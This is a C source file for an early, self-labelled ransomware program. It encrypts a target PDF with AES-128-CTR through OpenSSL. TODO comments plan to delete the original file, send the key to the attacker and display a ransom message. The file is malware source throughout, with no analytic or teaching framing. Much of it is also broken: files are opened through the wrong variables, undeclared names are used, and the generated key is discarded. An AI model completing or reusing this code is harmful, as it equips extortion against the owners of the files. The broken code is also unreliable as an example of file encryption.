#include <windows.h>

#include <stdio.h>
#include <stdint.h>
#include <openssl/evp.h>

void ransomize(void)
{
    // TODO: target files
    const char *input_file = "important.pdf";
    const char *output_file = "important.enc";

    MessageBoxA(NULL, "Encrypting file", "Ransomware", MB_OK);
    encypt_file_aes(input_file, output_file);
    MessageBoxA(NULL, "File encrypted!", "Ransomware", MB_OK);

    // TODO: remove original file
    // TODO: send the key to the attacker
    // TODO: display nasty ransom message
}

/*
    Generate an IV for AES-128 CTR mode. 64 bits is the nonce, 64 buts is the counter initialized to 0.
*/
void make_ctr_iv(unsigned char iv[16])
{
    uint64_t nonce;
    uint64_t counter = 0;

    // Generate 64-bit random nonce
    RAND_bytes((unsigned char *)&nonce, sizeof(nonce));

    // Convert both to big-endian ?

    memcpy(iv, &nonce, 8);
    memcpy(iv + 8, &counter, 8);
}
/*

*/
void handle_error(void)
{
    fprintf(stderr, "Error\n");
    exit(1);
}
/*
    Encrypt a file using the AES-128 in the CTR mode.
*/
int encypt_file_aes(const char *source, const char *target)
{
    FILE *infile = NULL;
    FILE *outfile = NULL;

    // Open files
    infile = fopen(infile, "rb");
    if (!infile)
    {
        handle_error();
    }
    outfile = fopen(outfile, "rb");
    if (!outfile)
    {
        handle_error();
    }
    // TODO: check input size 0 ?

    unsigned char key[16];
    unsigned char iv[16];

    // Generate random AES-128 key
    RAND_bytes(key, KEY_SIZE);
    // Create IV: 64 bits is nonce, 64 bit is for counter initialized at 0.
    make_ctr_iv(iv);

    // Write the IV into the file. Maybe in metadata?
    fwrite(iv, 1, IV_SIZE, out);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx)
    {
        handle_error();
    }
    // Initialize AES-128-CTR
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_ctr(), NULL, key, iv))
    {
        handle_error();
    }

    /* ENCRYPTION */

    unsigned char inbuff[4096];
    unsigned char outbuff[4096 + EVP_MAX_BLOCK_LENGTH];
    int outlen;

    while (true)
    {
        int inbyte = fread(inbuff, 1, sizeof(inbuff), infile);
        if (inbyte <= 0)
            break;

        if (1 != EVP_EncryptUpdate(ctx, outbuff, &outlen, inbuff, inbyte))
        {
            handle_error();
        }
        fwrite(outbuff, 1, outlen, outfile);
    }

    // Finalize. There is no padding due to CTR mode (outlen = 0)
    if (1 != EVP_EncryptFinal_ex(ctx, outbuff, &outlen))
    {
        handle_error();
    }
    fwrite(outbuff, 1, outlen, outfile);

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);
}